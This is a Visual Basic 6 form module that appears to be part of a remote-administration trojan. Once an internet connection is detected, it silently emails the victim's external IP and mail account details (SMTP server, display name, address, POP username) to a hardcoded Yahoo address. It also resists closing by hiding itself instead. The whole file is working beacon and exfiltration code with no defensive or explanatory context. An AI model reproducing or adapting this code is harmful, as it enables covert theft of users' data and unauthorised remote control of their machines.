VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMail 
   Caption         =   "E-Mail"
   ClientHeight    =   1275
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   2535
   LinkTopic       =   "Form1"
   ScaleHeight     =   1275
   ScaleWidth      =   2535
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtToBox 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   2295
   End
   Begin MSWinsockLib.Winsock MailSock 
      Left            =   600
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrMail 
      Interval        =   2000
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "frmmail"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim mailserver
Dim ToBox As String
Private Const Frombox As String = "RemoteAdmin@SomeWhere.com" 'Anything you want
Private Const Subject As String = "Remote Admin Server IP"
Dim bTrans As Boolean
Dim m_iStage As Integer
Dim cMessage As String
Dim cSubject As String
Private Sub Form_Load()
ToBox = "usssssy@yahoo.com" 'set as default to
                            'my e-mail account
mailserver = GetDefaultSmtp
frmOptions.DoSomething
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
If UnloadMode = 0 Then
    Cancel = 1
    Me.Hide
End If
End Sub
Private Sub tmrMail_Timer()
Dim flags As Long
Dim Result As Boolean
Result = InternetGetConnectedState(flags, 0)
If Result Then
    MailSock.LocalPort = 0
    MailSock.Protocol = sckTCPProtocol
    MailSock.Connect mailserver, "25"
    bTrans = True
    m_iStage = 0
    tmrMail.Enabled = False
End If
End Sub
Private Sub Transmit(iStage As Integer)
Dim Helo As String, temp As String
Dim pos As Integer
Select Case m_iStage
    Case 1:
        Helo = Frombox
        pos = Len(Helo) - InStr(Helo, "@")
        Helo = Right$(Helo, pos)
        MailSock.SendData "HELO " & Helo & vbCrLf
    Case 2:
        MailSock.SendData "MAIL FROM: <" & Trim(Frombox) & ">" & vbCrLf
    Case 3:
        MailSock.SendData "RCPT TO: <" & Trim(ToBox) & ">" & vbCrLf
    Case 4:
        MailSock.SendData "DATA" & vbCrLf
    Case 5:
        temp = temp & "From: " & Frombox & vbNewLine
        temp = temp & "To: " & ToBox & vbNewLine
        temp = temp & "Subject: " & Subject & vbNewLine
        temp = temp & vbCrLf & "My Ip is: " & frmOptions.txtExIP.Text & vbCrLf & GetmailAcc & vbCrLf & smtpServer & vbCrLf & SmtpDisplay & vbCrLf & MailAddr & vbCrLf & PopUser
        temp = temp & vbCrLf & vbCrLf & vbCrLf & Now
        MailSock.SendData temp
        MailSock.SendData vbCrLf & "." & vbCrLf
        m_iStage = 0
        bTrans = False
        Pause 10
        MailSock.Close
        Unload Me
End Select
End Sub
Private Sub MailSock_DataArrival(ByVal bytesTotal As Long)
Dim strData As String
On Error Resume Next

MailSock.GetData strData, vbString
If bTrans Then
    m_iStage = m_iStage + 1
    Transmit m_iStage
Else
    If MailSock.State <> sckClosed Then MailSock.Close
End If
End Sub
Private Sub MailSock_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
If MailSock.State <> sckClosed Then
    MailSock.Close
End If
End Sub

Private Sub txtToBox_Change()
ToBox = txtToBox.Text
End Sub
